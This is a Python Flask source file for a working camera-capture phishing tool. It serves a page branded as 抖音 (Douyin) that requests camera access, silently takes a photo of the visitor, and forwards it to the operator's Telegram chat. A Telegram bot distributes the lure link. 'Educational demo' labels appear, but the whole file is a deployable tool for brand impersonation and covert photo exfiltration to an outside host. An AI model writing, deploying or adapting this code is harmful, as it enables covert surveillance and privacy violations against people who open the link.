from flask import Flask, request, Response
import requests
import os

app = Flask(__name__)

# Get from environment variables
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
YOUR_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')

HTML_PAGE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>抖音</title></head>
<body style="background:black;text-align:center;color:white;font-family:Arial;margin-top:50px">
<h2>📸 需要相机权限</h2>
<p>网络安全教育演示</p>
<button onclick="startCamera()" style="background:#ff0050;color:white;padding:15px 40px;border:none;border-radius:30px;font-size:18px">允许使用相机</button>
<video id="v" autoplay style="width:300px;margin:20px;display:none"></video>
<div style="position:fixed;bottom:20px;left:20px;right:20px;background:#222;color:#ff9800;font-size:10px;padding:8px">⚠️ 网络安全教育演示</div>
<script>
function startCamera(){
document.querySelector('button').style.display='none';
document.querySelector('h2').innerHTML='🎥 正在启动相机...';
navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
let video=document.getElementById('v');
video.style.display='block';
video.srcObject=stream;
setTimeout(()=>{
let canvas=document.createElement('canvas');
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;
canvas.getContext('2d').drawImage(video,0,0);
canvas.toBlob(blob=>{
let form=new FormData();
form.append('photo',blob);
fetch('/upload',{method:'POST',body:form});
});
document.body.innerHTML='<h2>✅ 演示完成</h2><p>感谢参与安全教育</p>';
stream.getTracks().forEach(t=>t.stop());
},1000);
}).catch(()=>alert('需要相机权限'));
}
</script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/upload', methods=['POST'])
def upload():
    print("Upload endpoint hit")  # This will appear in Railway logs
    photo = request.files.get('photo')
    
    if photo:
        print(f"Photo received: {photo.filename}")
        # Send to Telegram
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
        files = {'photo': ('capture.jpg', photo, 'image/jpeg')}
        data = {'chat_id': YOUR_CHAT_ID, 'caption': '🎯 相机捕获 - 抖音教育演示'}
        
        response = requests.post(url, data=data, files=files)
        print(f"Telegram response: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            return 'Photo sent to Telegram!', 200
        else:
            return f'Telegram error: {response.text}', 500
    
    return 'No photo received', 400

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        
        if text == '/start':
            railway_url = os.environ.get('RAILWAY_URL', 'https://hello-camera-production.up.railway.app')
            send_message(chat_id, 
                f"🎭 *Camera Prank Bot*\n\n"
                f"Click this link to test camera permission:\n"
                f"{railway_url}\n\n"
                f"⚠️ Educational use only",
                parse_mode='Markdown')
        else:
            send_message(chat_id, "Send /start to begin")
    
    return Response('OK', status=200)

def send_message(chat_id, text, parse_mode=None):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    data = {'chat_id': chat_id, 'text': text}
    if parse_mode:
        data['parse_mode'] = parse_mode
    requests.post(url, data=data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
